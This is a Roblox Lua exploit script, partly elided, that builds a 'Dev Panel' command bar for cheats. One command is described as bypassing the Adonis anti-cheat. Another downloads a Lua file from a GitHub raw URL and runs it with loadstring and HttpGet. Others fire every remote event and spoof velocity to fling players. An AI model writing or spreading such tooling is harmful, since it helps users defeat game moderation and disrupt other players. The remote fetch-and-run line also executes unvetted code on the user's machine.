...
local PREFIX = ";"
local TITLE  = "Dev Panel"
local cmds = {}
local function addcmd(name, aliases, func)
    cmds[#cmds + 1] = { NAME = name, ALIAS = aliases or {}, FUNC = func }
end
local function findCmd(str)
    str = str:lower()
    for _, cmd in ipairs(cmds) do
        if cmd.NAME:lower() == str then return cmd end
        for _, a in ipairs(cmd.ALIAS) do
            if a:lower() == str then return cmd end
        end
    end
end
local function execCmd(str, plr)
    ...
    if cmd then task.spawn(function() pcall(cmd.FUNC, parts, plr) end) end
end
local function getPlayersByName(name)
    local found = {}
    name = name:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(name, 1, true) or
           p.DisplayName:lower():find(name, 1, true) then
            table.insert(found, p)
        end
    end
    return found
end
local function getPlayer(arg, plr)
    if not arg or arg == '' then return {plr} end
    local low = arg:lower()
    if low == 'me'     then return {plr} end
    if low == 'all'    then return Players:GetPlayers() end
    if low == 'others' then
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= plr then table.insert(t, p) end
        end
        return t
    end
    if low == 'random' then
        local all = Players:GetPlayers()
        return #all > 0 and {all[math.random(#all)]} or {}
    end
    if low == 'friends' then
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
    ...
    if low == 'team' then
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Team == plr.Team then table.insert(t, p) end
        end
        return t
    end
    return getPlayersByName(arg)
end
local _notifGui
local function DoNotif(msg, duration)
    duration = duration or 3
    if _notifGui then _notifGui:Destroy() end
    ...
    f.BorderSizePixel = 0
    f.Position = UDim2.new(0.5, -150, 0, -50)
...
Holder.Position = UDim2.new(1, -265, 1, -235)
Holder.Size = UDim2.new(0, 255, 0, 225)
Holder.Active = true
Holder.ZIndex = 10
local TitleBar = Instance.new('TextLabel', Holder)
TitleBar.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(0, 255, 0, 20)
...
do
    ...
    TitleBar.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true dragStart = inp.Position startPos = Holder.Position
        end
    end)
...
MinBtn.MouseButton1Click:Connect(function()
    ...
    Dark.Visible   = not minimized
    Cmdbar.Visible = not minimized
    CMDsF.Visible  = not minimized
    Holder.Size = minimized and UDim2.new(0,255,0,20) or UDim2.new(0,255,0,225)
    MinBtn.Text = minimized and '+' or '-'
end)
local function addCmdEntry(name, desc)
    local btn = Instance.new('TextButton', CMDsF)
    ...
    btn.Text = '  ' .. name .. (desc ~= '' and '  —  ' .. desc or '')
    btn.ZIndex = 10
    ...
    task.defer(function()
        CMDsF.CanvasSize = UDim2.new(0,0,0, cmdLayout.AbsoluteContentSize.Y + 4)
    end)
end
Cmdbar.FocusLost:Connect(function(enter)
    if not enter then return end
    local text = Cmdbar.Text:gsub('^%s*(.-)%s*$', '%1')
    if text:sub(1, #PREFIX):lower() == PREFIX:lower() then text = text:sub(#PREFIX+1) end
    if text ~= '' then execCmd(text, speaker) end
    Cmdbar.Text = ''
end)
local function onChat(msg)
    if msg:sub(1,#PREFIX):lower() ~= PREFIX:lower() then return end
    execCmd(msg:sub(#PREFIX+1), speaker)
end
pcall(function()
    TextChatService.MessageReceived:Connect(function(m)
        if m.TextSource and m.TextSource.UserId == LocalPlayer.UserId then onChat(m.Text) end
    end)
end)
LocalPlayer.Chatted:Connect(onChat)
addcmd("AdonisBypasser", {"noadonis"}, function(args, speaker)
...
addCmdEntry("AdonisBypasser", "Silences the anti detectors within adonis's core.anti")
addcmd("Zex+", {"dex", "zex"}, function(args, speaker)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/idioticanisgae-pixel/Moon/refs/heads/main/fallback.lua"))()
end)
addCmdEntry("Zex+", "A lightweight faster dex with module poison function.")
addcmd("Bruteforce", {"fireall"}, function(args, speaker)
...
addCmdEntry("Bruteforce", "fires all remotes.")
addcmd("velocityspoof", {"antiaim"}, function(args, speaker)
    local RunService = game:GetService("RunService")
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Config = {
        Enabled = true,
        PoisonVector = Vector3.new(0, -50000, 0), 
    }
    local RootPart = nil
...
addCmdEntry("velocityspoof", "can be used to counter aimbots or as a touchfling")
task.defer(function()
    CMDsF.CanvasSize = UDim2.new(0,0,0, cmdLayout.AbsoluteContentSize.Y + 4)
end)
DoNotif("Zuka Panel loaded!", 3)
local TweenService = game:GetService("TweenService")
local RunService   = game:GetService("RunService")
